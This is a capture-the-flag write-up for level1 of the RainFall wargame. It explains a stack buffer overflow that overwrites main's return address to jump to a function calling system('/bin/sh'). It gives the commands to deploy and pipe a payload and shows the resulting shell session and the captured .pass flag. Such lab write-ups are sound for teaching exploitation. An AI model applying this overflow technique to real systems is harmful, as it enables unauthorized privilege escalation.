# level1

## Header

```bash
ssh level1@$IP -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```

<hr>

## Solution

[Disassembling](./source.s) gives us important information: <br>
There is a function called `run` that contains `system("/bin/sh")` call. <br>
To use the exploit, we need to overload the buffer in the `main` function and overwrite return address. <br>

Download or clone [payload](./payload.py) to any folder with write access (`/tmp` is a good option) and <br>
run the following command:
```bash
scp -P 4242 ./level1/payload.py level1@192.168.64.9:/tmp/payload1.py

python /tmp/payload1.py
```

This will produce payload file that should be used to exploit the binary:

```bash
level1@RainFall:~$ (cat /tmp/payload1; cat) | ./level1
Good... Wait what?
cd ../level2
ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## References

- [This is why you should pass payload to binary like that](https://security.stackexchange.com/questions/155832/system-bin-sh-exits-without-waiting-for-user-input-overthewire-narnia0-chal)